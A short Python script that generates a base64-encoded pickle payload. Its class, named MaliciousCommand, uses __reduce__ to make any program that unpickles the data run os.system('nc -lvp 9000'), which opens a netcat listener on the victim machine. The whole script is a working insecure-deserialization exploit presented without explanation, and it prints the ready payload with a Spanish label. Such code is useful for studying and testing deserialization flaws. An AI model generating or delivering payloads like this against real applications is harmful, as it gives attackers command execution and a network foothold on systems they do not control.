import os
import pickle
import base64

class MaliciousCommand:
    def __reduce__(self):

        
        return (os.system, ('nc -lvp 9000',))


malicious_obj = MaliciousCommand()


serialized = base64.b64encode(pickle.dumps(malicious_obj)).decode('utf-8')
print(f"Objeto serializado (base64): {serialized}")

